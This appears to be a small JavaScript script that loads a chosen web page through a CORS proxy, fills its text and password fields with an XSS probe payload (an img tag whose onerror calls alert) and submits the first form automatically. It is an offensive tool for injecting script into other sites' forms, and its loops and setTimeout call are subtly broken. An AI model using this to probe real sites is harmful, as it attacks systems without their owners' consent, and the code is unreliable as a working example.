import ff from "https://fastframework.ga/ff.js";

ff.activateShortcuts();
ff.defineShortcut("_", alert);

ael($("#urlB"), "click", CORS => {

  const textPayload = "<img       onerror=alert(/hackeado/)       src= >";

  CORS = "https://cors-anywhere.herokuapp.com/";
  ff._GET(CORS + $("#url").value, (resp, data, i, x) => {
    ff.customTags = {
      externalCode: resp
    };
    ff.getUnknownTags();
      data = $("externalCode").querySelectorAll("form");
      for(let i = 0, inputs; i < data.length; ++i) {
        inputs = data[i].querySelectorAll("input");
        for(let j = 0; j < inputs.length; ++j) {
_(""+inputs[i].type);
          switch(""+inputs[i].type) {
	    case "text" :
_("text input filled");
	      inputs[i].value = textPayload;
	    break;
	    case "password":
_("password input filled");
	      inputs[i].value = textPayload;
	    break;
	    default:
	      inputs[i].value = "default";
          }
        }
      }
        setTimeout(data[0].submit());
      
  });
});
